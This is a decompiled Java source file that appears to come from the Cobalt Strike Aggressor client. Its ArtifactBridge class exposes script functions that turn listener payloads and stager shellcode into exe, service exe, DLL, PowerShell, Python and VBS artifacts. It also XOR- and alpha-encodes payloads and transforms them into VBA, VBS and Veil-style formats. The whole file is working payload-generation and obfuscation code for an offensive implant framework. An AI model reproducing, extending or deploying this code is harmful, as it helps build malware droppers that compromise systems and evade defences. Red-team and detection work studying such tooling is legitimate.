package aggressor.bridges;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.ArtifactUtils;
import common.Callback;
import common.CommonUtils;
import common.License;
import common.ListenerUtils;
import common.MutantResourceUtils;
import common.PowerShellUtils;
import common.ResourceUtils;
import common.ScListener;
import cortana.Cortana;
import encoders.Transforms;
import java.util.Stack;
import sleep.bridges.BridgeUtilities;
import sleep.bridges.SleepClosure;
import sleep.interfaces.Function;
import sleep.interfaces.Loadable;
import sleep.runtime.Scalar;
import sleep.runtime.ScriptInstance;
import sleep.runtime.SleepUtils;

public class ArtifactBridge implements Function, Loadable {
   protected AggressorClient client;

   public ArtifactBridge(AggressorClient var1) {
      this.client = var1;
   }

   public void scriptLoaded(ScriptInstance var1) {
      Cortana.put(var1, "&artifact_sign", this);
      Cortana.put(var1, "&transform", this);
      Cortana.put(var1, "&transform_vbs", this);
      Cortana.put(var1, "&encode", this);
      Cortana.put(var1, "&str_chunk", this);
      Cortana.put(var1, "&artifact_payload", this);
      Cortana.put(var1, "&artifact_stager", this);
      Cortana.put(var1, "&artifact_general", this);
      Cortana.put(var1, "&payload", this);
      Cortana.put(var1, "&stager", this);
      Cortana.put(var1, "&stager_bind_tcp", this);
      Cortana.put(var1, "&stager_bind_pipe", this);
      Cortana.put(var1, "&artifact", this);
      Cortana.put(var1, "&artifact_stageless", this);
      Cortana.put(var1, "&shellcode", this);
      Cortana.put(var1, "&powershell", this);
   }

   public void scriptUnloaded(ScriptInstance var1) {
   }

   public byte[] toArtifact(byte[] var1, String var2, String var3) {
      byte[] var4 = new byte[0];
      if ("x64".equals(var2)) {
         if ("exe".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64.exe");
         } else if ("svcexe".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64svc.exe");
         } else {
            if ("dll".equals(var3)) {
               throw new RuntimeException("Can not generate an x86 dll for an x64 stager. Try dllx64");
            }

            if ("dllx64".equals(var3)) {
               var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64.x64.dll");
            } else if ("powershell".equals(var3)) {
               var4 = (new ResourceUtils(this.client)).buildPowerShell(var1, true);
            } else if ("python".equals(var3)) {
               var4 = (new ResourceUtils(this.client)).buildPython(new byte[0], var1);
            } else if ("raw".equals(var3)) {
               var4 = var1;
            } else if ("vbscript".equals(var3)) {
               throw new RuntimeException("The VBS output is only compatible with x86 stagers (for now)");
            }
         }
      } else {
         if (!"x86".equals(var2)) {
            throw new RuntimeException("Invalid arch valid '" + var2 + "'");
         }

         if ("exe".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32.exe");
         } else if ("svcexe".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32svc.exe");
         } else if ("dll".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32.dll");
         } else if ("dllx64".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64.dll");
         } else if ("powershell".equals(var3)) {
            var4 = (new ResourceUtils(this.client)).buildPowerShell(var1, false);
         } else if ("python".equals(var3)) {
            var4 = (new ResourceUtils(this.client)).buildPython(var1, new byte[0]);
         } else if ("raw".equals(var3)) {
            var4 = var1;
         } else {
            if (!"vbscript".equals(var3)) {
               throw new RuntimeException("Unrecognized artifact type: '" + var3 + "'");
            }

            var4 = (new MutantResourceUtils(this.client)).buildVBS(var1);
         }
      }

      return var4;
   }

   public byte[] toStagelessArtifact(byte[] var1, String var2, String var3) {
      byte[] var4 = new byte[0];
      if ("x64".equals(var2)) {
         if (var3.equals("exe")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64big.exe");
         } else if (var3.equals("svcexe")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64svcbig.exe");
         } else if (var3.equals("dllx64")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64big.x64.dll");
         } else if (var3.equals("powershell")) {
            var4 = (new ResourceUtils(this.client)).buildPowerShell(var1, true);
         } else if (var3.equals("python")) {
            var4 = (new ResourceUtils(this.client)).buildPython(new byte[0], var1);
         } else {
            if (!var3.equals("raw")) {
               throw new RuntimeException("Unrecognized artifact type: '" + var3 + "'");
            }

            var4 = var1;
         }
      } else {
         if (!"x86".equals(var2)) {
            throw new RuntimeException("Invalid arch valid '" + var2 + "'");
         }

         if (var3.equals("exe")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32big.exe");
         } else if (var3.equals("svcexe")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32svcbig.exe");
         } else if (var3.equals("dll")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32big.dll");
         } else if (var3.equals("dllx64")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64big.dll");
         } else if (var3.equals("powershell")) {
            var4 = (new ResourceUtils(this.client)).buildPowerShell(var1);
         } else if (var3.equals("python")) {
            var4 = (new ResourceUtils(this.client)).buildPython(var1, new byte[0]);
         } else {
            if (!var3.equals("raw")) {
               throw new RuntimeException("Unrecognized artifact type: '" + var3 + "'");
            }

            var4 = var1;
         }
      }

      return var4;
   }

   public Scalar evaluate(String var1, ScriptInstance var2, Stack var3) {
      byte[] var10;
      if ("&artifact_sign".equals(var1)) {
         var10 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
         return SleepUtils.getScalar(DataUtils.getSigner(this.client.getData()).sign(var10));
      } else {
         final String var4;
         final String var5;
         final String var6;
         final String var7;
         if ("&artifact_stageless".equals(var1)) {
            var4 = BridgeUtilities.getString(var3, "");
            var5 = BridgeUtilities.getString(var3, "");
            var6 = BridgeUtilities.getString(var3, "x86");
            var7 = BridgeUtilities.getString(var3, "");
            final SleepClosure var8 = BridgeUtilities.getFunction(var3, var2);
            this.client.getConnection().call("aggressor.ping", CommonUtils.args(var4), new Callback() {
               public void result(String var1, Object var2) {
                  ScListener var3 = ListenerUtils.getListener(ArtifactBridge.this.client, var4);
                  var3.setProxyString(var7);
                  byte[] var4x = (byte[])var3.export(var6);
                  byte[] var5x = ArtifactBridge.this.toStagelessArtifact(var4x, var6, var5);
                  Stack var6x = new Stack();
                  var6x.push(SleepUtils.getScalar(var5x));
                  SleepUtils.runCode((SleepClosure)var8, "&artifact_stageless", (ScriptInstance)null, var6x);
               }
            });
         } else {
            byte[] var9;
            ScListener var16;
            byte[] var18;
            if ("&artifact_payload".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "");
               var6 = BridgeUtilities.getString(var3, "x86");
               var16 = ListenerUtils.getListener(this.client, var4);
               if (var16 == null) {
                  throw new RuntimeException("No listener '" + var1 + "'");
               }

               var18 = (byte[])var16.export(var6);
               var9 = this.toStagelessArtifact(var18, var6, var5);
               return SleepUtils.getScalar(var9);
            }

            if ("&artifact_general".equals(var1)) {
               var10 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var5 = BridgeUtilities.getString(var3, "");
               var6 = BridgeUtilities.getString(var3, "x86");
               if (var10.length < 1024) {
                  return SleepUtils.getScalar(this.toArtifact(var10, var6, var5));
               }

               return SleepUtils.getScalar(this.toStagelessArtifact(var10, var6, var5));
            }

            if ("&artifact_stager".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "x86");
               var6 = BridgeUtilities.getString(var3, "");
               var16 = ListenerUtils.getListener(this.client, var4);
               if (var16 == null) {
                  throw new RuntimeException("No listener '" + var1 + "'");
               }

               return SleepUtils.getScalar(this.toArtifact(var16.getPayloadStager(var5), var5, var6));
            }

            ScListener var15;
            if ("&stager".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "x86");
               var15 = ListenerUtils.getListener(this.client, var4);
               if (var15 == null) {
                  throw new RuntimeException("No listener '" + var1 + "'");
               }

               return SleepUtils.getScalar(var15.getPayloadStager(var5));
            }

            if ("&stager_bind_tcp".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "x86");
               int var17 = BridgeUtilities.getInt(var3, CommonUtils.randomPort());
               var16 = ListenerUtils.getListener(this.client, var4);
               return SleepUtils.getScalar(var16.getPayloadStagerLocal(var17, "x86"));
            }

            if ("&stager_bind_pipe".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "x86");
               var15 = ListenerUtils.getListener(this.client, var4);
               var7 = var15.getConfig().getStagerPipe();
               if ("x86".equals(var5)) {
                  return SleepUtils.getScalar(var15.getPayloadStagerPipe(var7, "x86"));
               }

               throw new RuntimeException("x86 is the only arch option available with &stager_remote");
            }

            if ("&payload".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "x86");
               var15 = ListenerUtils.getListener(this.client, var4);
               if (var15 == null) {
                  throw new RuntimeException("No listener '" + var1 + "'");
               }

               return SleepUtils.getScalar(var15.export(var5));
            }

            if ("&artifact".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "");
               Scalar var13 = BridgeUtilities.getScalar(var3);
               var7 = BridgeUtilities.getString(var3, "x86");
               ScListener var19 = ListenerUtils.getListener(this.client, var4);
               return SleepUtils.getScalar(this.toArtifact(var19.getPayloadStager(var7), var7, var5));
            }

            Scalar var12;
            if ("&shellcode".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var12 = BridgeUtilities.getScalar(var3);
               var6 = BridgeUtilities.getString(var3, "x86");
               var16 = ListenerUtils.getListener(this.client, var4);
               if ("x64".equals(var6)) {
                  var18 = var16.getPayloadStager("x64");
                  return SleepUtils.getScalar(var18);
               }

               var18 = var16.getPayloadStager("x86");
               return SleepUtils.getScalar(var18);
            }

            if ("&powershell".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var12 = BridgeUtilities.getScalar(var3);
               var6 = BridgeUtilities.getString(var3, "x86");
               var16 = ListenerUtils.getListener(this.client, var4);
               if ("x64".equals(var6)) {
                  var18 = var16.getPayloadStager("x64");
                  var9 = (new PowerShellUtils(this.client)).buildPowerShellCommand(var18, true);
                  return SleepUtils.getScalar(CommonUtils.bString(var9));
               }

               var18 = var16.getPayloadStager("x86");
               var9 = (new PowerShellUtils(this.client)).buildPowerShellCommand(var18);
               return SleepUtils.getScalar(CommonUtils.bString(var9));
            }

            if ("&encode".equals(var1)) {
               var10 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var5 = BridgeUtilities.getString(var3, "");
               var6 = BridgeUtilities.getString(var3, "x86");
               if (License.isTrial()) {
                  return SleepUtils.getScalar(var10);
               }

               if ("xor".equals(var5)) {
                  return SleepUtils.getScalar(ArtifactUtils._XorEncode(var10, var6));
               }

               if ("alpha".equals(var5) && "x86".equals(var6)) {
                  byte[] var14 = new byte[]{-21, 3, 95, -1, -25, -24, -8, -1, -1, -1};
                  return SleepUtils.getScalar(CommonUtils.join(var14, CommonUtils.toBytes(ArtifactUtils._AlphaEncode(var10))));
               }

               throw new IllegalArgumentException("No encoder '" + var5 + "' for " + var6);
            }

            int var11;
            if ("&str_chunk".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var11 = BridgeUtilities.getInt(var3, 100);
               return SleepUtils.getArrayWrapper(ArtifactUtils.toChunk(var4, var11));
            }

            if ("&transform".equals(var1)) {
               var10 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var5 = BridgeUtilities.getString(var3, "");
               if ("array".equals(var5)) {
                  return SleepUtils.getScalar(Transforms.toArray(var10));
               }

               if ("escape-hex".equals(var5)) {
                  return SleepUtils.getScalar(Transforms.toVeil(var10));
               }

               if ("hex".equals(var5)) {
                  return SleepUtils.getScalar(ArtifactUtils.toHex(var10));
               }

               if ("powershell-base64".equals(var5)) {
                  return SleepUtils.getScalar(CommonUtils.Base64PowerShell(CommonUtils.bString(var10)));
               }

               if ("vba".equals(var5)) {
                  return SleepUtils.getScalar(Transforms.toVBA(var10));
               }

               if ("vbs".equals(var5)) {
                  return SleepUtils.getScalar(ArtifactUtils.toVBS(var10));
               }

               if ("veil".equals(var5)) {
                  return SleepUtils.getScalar(Transforms.toVeil(var10));
               }

               throw new IllegalArgumentException("Type '" + var5 + "' is unknown");
            }

            if ("&transform_vbs".equals(var1)) {
               var10 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var11 = BridgeUtilities.getInt(var3, 8);
               return SleepUtils.getScalar(ArtifactUtils.toVBS(var10, var11));
            }
         }

         return SleepUtils.getEmptyScalar();
      }
   }
}
